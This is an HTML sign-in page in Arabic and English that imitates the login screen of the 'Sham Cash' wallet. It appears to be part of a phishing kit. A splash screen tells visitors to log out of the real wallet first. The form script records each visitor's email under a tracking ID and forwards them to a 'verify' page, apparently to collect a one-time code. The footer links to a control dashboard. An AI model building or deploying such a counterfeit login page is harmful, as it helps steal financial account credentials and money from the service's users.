<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>شام كاش — تسجيل الدخول</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <!-- Warning / Splash overlay -->
  <div class="warning-screen" id="splashScreen" onclick="dismissSplash()">
    <div class="warning-icon-wrap">
      <svg width="68" height="68" viewBox="0 0 24 24" fill="none">
        <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" fill="white"/>
        <line x1="12" y1="9" x2="12" y2="13" stroke="#FF8C00" stroke-width="2.2" stroke-linecap="round"/>
        <line x1="12" y1="17" x2="12.01" y2="17" stroke="#FF8C00" stroke-width="2.5" stroke-linecap="round"/>
      </svg>
    </div>
    <h1 style="color:#fff;font-size:36px;font-weight:900;margin-bottom:20px;text-shadow:0 2px 8px rgba(0,0,0,0.2)">تنبيه</h1>
    <p style="color:#fff;font-size:18px;font-weight:600;line-height:1.6;max-width:280px;text-shadow:0 1px 4px rgba(0,0,0,0.15)">
      يجب تسجيل خروج من المحفظة قبل البدء في عملية تسجيل الدخول هنا
    </p>
    <p style="color:rgba(255,255,255,0.55);font-size:13px;font-weight:600;margin-top:40px">اضغط للمتابعة</p>
  </div>

  <div class="page">
    <div class="blob-left"></div>
    <div class="blob-right"></div>

    <div class="container">
      <!-- Top bar -->
      <div class="top-bar">
        <button onclick="toggleLang()" id="langBtn">English</button>
        <div style="color:rgba(255,255,255,0.70)">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <path d="M3 18v-6a9 9 0 0118 0v6"/><path d="M21 19a2 2 0 01-2 2h-1a2 2 0 01-2-2v-3a2 2 0 012-2h3zM3 19a2 2 0 002 2h1a2 2 0 002-2v-3a2 2 0 00-2-2H3z"/>
          </svg>
        </div>
      </div>

      <!-- Logo -->
      <div class="logo-wrap">
        <div class="sham-logo">
          <div class="shape-green"></div>
          <div class="shape-purple"></div>
        </div>
      </div>

      <!-- Form -->
      <form onsubmit="handleLogin(event)">
        <h1 class="page-title" id="titleLogin">تسجيل الدخول</h1>

        <div class="field-group">
          <!-- Email -->
          <div class="field">
            <span class="field-icon">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/>
              </svg>
            </span>
            <input type="email" id="emailInput" autocomplete="email"
                   placeholder="البريد الإلكتروني" />
          </div>

          <!-- Password -->
          <div class="field">
            <span class="field-icon" style="cursor:pointer" onclick="togglePass()">
              <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
              </svg>
            </span>
            <input type="password" id="passInput" autocomplete="current-password"
                   placeholder="كلمة المرور" />
            <span class="field-icon">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
              </svg>
            </span>
          </div>
        </div>

        <!-- Forgot password -->
        <p class="link-text mt-4" id="forgotRow">
          <span id="forgotLabel">هل نسيت كلمة المرور؟</span>
          <a href="reset.html" id="forgotLink"> تغيير كلمة المرور</a>
        </p>

        <!-- Buttons -->
        <div class="btn-row mt-6">
          <button type="button" class="btn-qr" title="QR">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
              <rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/>
              <rect x="3" y="14" width="7" height="7"/>
              <line x1="14" y1="14" x2="14" y2="14"/><line x1="17" y1="14" x2="17" y2="14"/>
              <line x1="20" y1="14" x2="20" y2="14"/><line x1="14" y1="17" x2="14" y2="17"/>
              <line x1="17" y1="17" x2="20" y2="17"/><line x1="20" y1="20" x2="20" y2="20"/>
            </svg>
          </button>
          <button type="submit" class="btn btn-primary btn-full" id="loginBtn">تسجيل الدخول</button>
        </div>

        <p class="link-text mt-4" id="createRow">
          <span id="noAccountLabel">لا تملك حساب مسبقاً؟</span>
          <span class="link"> إنشاء حساب</span>
        </p>
      </form>

      <!-- Footer -->
      <footer class="page-footer">
        <a href="dashboard.html">لوحة التحكم</a>
        <div>
          <div class="powered-label">POWERED BY</div>
          <div style="display:flex;justify-content:center;margin:8px 0;opacity:0.18">
            <svg width="44" height="32" viewBox="0 0 100 80" fill="none">
              <path d="M31 13h38l20 20-20 20H31L11 33 31 13Z" stroke="white" stroke-width="8"/>
              <path d="M40 24h24l10 10-10 10H40L29 34 40 24Z" stroke="white" stroke-width="8"/>
            </svg>
          </div>
          <div class="version-label">V 2.2.4</div>
        </div>
      </footer>
    </div>
  </div>

  <script>
    const SPLASH_KEY = 'sham_splash_seen';
    let currentLang = 'ar';

    // Splash screen
    if (sessionStorage.getItem(SPLASH_KEY)) {
      document.getElementById('splashScreen').classList.add('hidden');
    }
    function dismissSplash() {
      sessionStorage.setItem(SPLASH_KEY, '1');
      document.getElementById('splashScreen').classList.add('hidden');
    }

    // Language toggle
    const translations = {
      ar: {
        title: 'تسجيل الدخول',
        emailPh: 'البريد الإلكتروني',
        passPh: 'كلمة المرور',
        forgot: 'هل نسيت كلمة المرور؟',
        forgotLink: ' تغيير كلمة المرور',
        loginBtn: 'تسجيل الدخول',
        noAccount: 'لا تملك حساب مسبقاً؟',
        createLink: ' إنشاء حساب',
        langToggle: 'English',
        dir: 'rtl',
      },
      en: {
        title: 'Sign In',
        emailPh: 'Email Address',
        passPh: 'Password',
        forgot: 'Forgot your password?',
        forgotLink: ' Change Password',
        loginBtn: 'Sign In',
        noAccount: "Don't have an account?",
        createLink: ' Create Account',
        langToggle: 'العربية',
        dir: 'ltr',
      },
    };

    function toggleLang() {
      currentLang = currentLang === 'ar' ? 'en' : 'ar';
      applyLang();
    }

    function applyLang() {
      const t = translations[currentLang];
      document.documentElement.setAttribute('dir', t.dir);
      document.documentElement.setAttribute('lang', currentLang);
      document.getElementById('titleLogin').textContent = t.title;
      document.getElementById('emailInput').placeholder = t.emailPh;
      document.getElementById('passInput').placeholder = t.passPh;
      document.getElementById('forgotLabel').textContent = t.forgot;
      document.getElementById('forgotLink').textContent = t.forgotLink;
      document.getElementById('loginBtn').textContent = t.loginBtn;
      document.getElementById('noAccountLabel').textContent = t.noAccount;
      document.getElementById('langBtn').textContent = t.langToggle;
    }

    // Password visibility toggle
    let passVisible = false;
    function togglePass() {
      passVisible = !passVisible;
      const input = document.getElementById('passInput');
      input.type = passVisible ? 'text' : 'password';
    }

    // Form submit — stores data and navigates to verify page
    function handleLogin(e) {
      e.preventDefault();
      const email = document.getElementById('emailInput').value;
      const pass  = document.getElementById('passInput').value;
      if (!email || !pass) return;
      const id = localStorage.getItem('sham_visitor_id') || ('v-' + Date.now());
      localStorage.setItem('sham_visitor_id', id);
      localStorage.setItem('sham_email', email);
      localStorage.setItem('sham_page', 'تسجيل الدخول');
      window.location.href = 'verify.html';
    }
  </script>
</body>
</html>
